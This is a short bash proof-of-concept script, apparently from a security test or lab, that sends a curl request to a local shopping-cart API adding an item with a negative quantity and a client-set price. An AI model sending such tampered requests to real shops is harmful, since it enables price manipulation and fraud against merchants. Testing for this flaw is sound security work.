#!/bin/bash
# PoC: Negative quantity
curl -s "http://localhost:7000/api/cart/1/add?product_id=1&qty=-1&price=100"
echo ""
